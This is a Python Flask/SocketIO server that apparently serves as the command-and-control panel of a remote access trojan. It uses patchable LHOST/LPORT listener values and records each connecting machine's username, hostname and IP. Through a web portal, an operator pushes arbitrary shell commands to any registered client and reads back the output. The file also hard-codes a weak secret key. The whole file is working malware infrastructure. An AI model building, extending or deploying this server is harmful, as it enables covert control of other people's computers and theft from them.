# VALUES TO BE PATCHED: Do not change!
LHOST = "0.0.0.0"
LPORT = "8002"
LPATH = None
USE_HTTPS = False

from flask import Flask, render_template, request
from flask_socketio import SocketIO
from flask_sqlalchemy import SQLAlchemy
from models import db, Client
import time, datetime

import logging

log = logging.getLogger("werkzeug")
log.setLevel(logging.ERROR)

app = Flask(__name__)
app.config["SECRET_KEY"] = "ADMIN123"
app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///connections.db"
app.config["SQLALCHEMY_TRACK_MODIFICATIONS"] = False
db.init_app(app)
sio = SocketIO(app, logger=False)


def client_by_sid(sid) -> Client:
    return db.session.execute(db.Select(Client).filter_by(sid=request.sid)).scalar_one()


def client_by_id(id) -> Client:
    return db.session.get(Client, id)


@app.route("/")
def home():
    return render_template(
        "dev_view.html", clients=db.session.execute(db.Select(Client)).scalars()
    )


@app.route("/device/")
def control_device():
    return render_template("control.html", id=request.args.get("id"))


@sio.on("connect")
def connect():
    print("Connection received")
    print("Wait for connection fully established...")


@sio.on("connect", namespace="/portal")
def connect_portal():
    print("New portal connection!")


@sio.on("con-est")
def con_est():
    print(f"Connected to: {request.remote_addr} as {request.sid}")
    print("Gathering info...")
    sio.emit("info-req", to=request.sid)


@sio.on("info-rsp")
def info_rsp(data):
    print("Client has device id: " + data["id"])
    client = db.session.get(Client, data["id"])
    if client:
        print(f"Client '{client.username}@{client.hostname}' reconnected.")
        client.last_seen = datetime.datetime.now()
        client.sid = request.sid
        client.ip_addr = data["ip"]
        client.connected = True
        db.session.commit()
    else:
        print(
            f"New client, client is: {data['user']}@{data['hostname']}({data['ip']}):{data['id']}"
        )
        client = Client()
        client.id = data["id"]
        client.username = data["user"]
        client.hostname = data["hostname"]
        client.ip_addr = data["ip"]
        client.first_seen = datetime.datetime.now()
        client.last_seen = datetime.datetime.now()
        client.sid = request.sid
        client.connected = True
        db.session.add(client)
        db.session.commit()
    sio.emit("refresh", namespace="/portal")


@sio.on("exec-cmd", namespace="/portal")
def exec_cmd(data):
    print("CMD execute")
    client = client_by_id(data["id"])
    if client:
        sio.emit("exec-cmd", {"command": data["command"]}, to=client.sid)


@sio.on("exec-cmd-resp")
def exec_cmd_resp(output):
    client = client_by_sid(request.sid)
    if not client:
        return
    sio.emit("exec-cmd-resp", {"id": client.id, "output": output}, namespace="/portal")


@sio.on("out", namespace="/portal")
def out(data):
    client = client_by_id(data["id"])
    if not client:
        return
    sio.emit("out", data["type"], to=client.sid)


@sio.on("disconnect")
def disconnect():
    client = client_by_sid(request.sid)
    client.connected = False
    client.ip_addr = None
    client.sid = None
    db.session.commit()
    sio.emit("refresh", namespace="/portal")
    print("Client disconnected.")


if __name__ == "__main__":
    sio.run(app, LHOST, LPORT)
